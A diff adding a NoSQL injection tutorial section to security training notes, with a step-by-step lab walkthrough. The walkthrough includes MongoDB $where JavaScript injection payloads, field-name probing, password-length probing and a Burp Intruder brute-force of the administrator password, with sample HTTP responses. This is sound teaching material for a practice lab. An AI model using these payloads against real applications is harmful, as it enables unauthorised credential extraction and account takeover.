@@ -243,4 +243,166 @@ Right-click the response and select "Request in Browser" > "In current browser s
 
 > NOTE: Check out [walkthrough](nosql_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## Exploiting syntax injectin to extract data
+
+Many NoSQL databases, like MongoDB, support limited JavaScript execution through features such as the `$where` operator or the `mapReduce()` function. If an application is vulnerable and utilizes these features, the database might evaluate injected JavaScript to extract sensitive data from the database.
+
+### Exfiltrating data in MongoDB
+
+Imagine an insecure application that lets users look up other usernames and displays their roles. When a user searches for "admin", it sends a request like this:
+
+```
+https://insecure-website.com/user/lookup?username=admin
+```
+
+This triggers a NoSQL query using the `$where` operator, such as:
+
+```json
+{ "$where": "this.username == 'admin'" }
+```
+
+Because `$where` executes JavaScript, you can try injecting JavaScript code to access sensitive data. For instance, sending:
+
+```
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+
+would modify the query and help you check if the first character of the admin's password is "a". By doing this iteratively, you could extract the password one character at a time. You can also use JavaScript functions like `match()` to test patterns. For example:
+
+```
+admin' && this.password.match(/\d/) || 'a'=='b
+```
+
+would tell you whether the password includes any digits.
+
+### Identifying field names
+
+Since MongoDB supports semi-structired data without a strict schema, you may first need to identify which fields exist in a collection before extracting data via JavaScript injection.
+
+To check if a field like `password` exists, you can inject a payload such as:
+
+```
+https://insecure-website.com/user/lookup?username=admin' && this.password!='
+```
+
+Then, compare the server's response to similar requests using a known valid field and a likely invalid one:
+
+- For a known field: `admin' && this.username!='`
+- For a likely non-existent field: `admin' && this.foo!='`
+
+If the response to the `password` payload resembles that of the known field (`username`) and differs from the invalid one (`foo`), it's a good sign that the `password` field exists in the database. 
+
+### Identifying field names - Continued
+
+To discover different field names, you can try a dictionary attack by cycling through a wordlist of possible field names.
+
+> NOTE: Alternatively, you can extract field names one character at a time using NoSQL operator injection. This method avoids relying on guesses or precompiled lists.
+
+### Lab: Exploiting NoSQL injection to extract data
+
+In Burp's browser, log in as `wiener:peter` and in Proxy history find a `GET /user/lookup?user=wiener` request with response body:
+
+```
+{
+  "username": "wiener",
+  "email": "wiener@normal-user.net",
+  "role": "user"
+}
+```
+
+Right-click it and Send to Repeater. Add `'` character to the query and click Send. Notice, that this causes an error:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 58
+
+{
+  "message": "There was an error getting user details"
+}
+```
+
+This might indicate that the user input was not filtered or sanitized correctly. Submit a valid JavaScript payload in the user parameter. For example, use URL-encoded `wiener'+'`: `wiener'%2b'` and send the request:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 81
+
+{
+  "username": "wiener",
+  "email": "wiener@normal-user.net",
+  "role": "user"
+}
+```
+
+As you can see the request went through normally and retrieved user information, which indicates that a form of server-side injection may be occurring.
+
+Identify whether you can inject boolean conditions to change the response. Submit a false condition as `user` query parameter, a URL-encoded `wiener' && '1'=='2`: `wiener'+%26%26+'1'%3d%3d'2` and send the request:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 38
+
+{
+  "message": "Could not find user"
+}
+```
+
+Now submit a true condition, simply change `2` to `1` in the previous payload and send the request:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 81
+
+{
+  "username": "wiener",
+  "email": "wiener@normal-user.net",
+  "role": "user"
+}
+```
+
+This demonstrates that you can trigger different responses for true and false conditions. Now identify the password length, change the user parameter to `administrator` and add the following condition `&& this.password.length < 30 || 'a'=='b`, URL-encode the entire query and send the request:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 96
+
+{
+  "username": "administrator",
+  "email": "admin@normal-user.net",
+  "role": "administrator"
+}
+```
+
+This indicates that the condition is true, because the password is less than 30 characters. Now if we keep trying lower and lower numbers instead of 30, eventually we'll get to 8, which will return:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 38
+
+{
+  "message": "Could not find user"
+}
+```
+
+So this means, there are 8 characters (`<9`) in the password. Now we are going to brute force this password using Burp's __Intruder__. Right-click the request and select "Send to Intruder". Enter this string as query value: `administrator' && this.password[§0§]=='§a§`
+and URL encode it. 
+
+In the Payloads side panel, select position 1 from the Payload position drop-down list. Add numbers from 0 to 7 for each character of the password. Select position 2 from the Payload position drop-down list, then add lowercase letters from a to z. Click __start attack__.
+
+Sort by _Payload 1_ lowest to highest and then _Length_ highest to lowest. Eventually, you'll get a correct character for each Payload 1 position (0-7) out of which you can assemble a password. Log in as `administrator` with that password to solve the lab.
+
+> NOTE: Check out [walkthrough](nosql_lab03_zaproxy.md) of this lab's __brute-force section__ in OWASP Zed Attack Proxy 
+
 
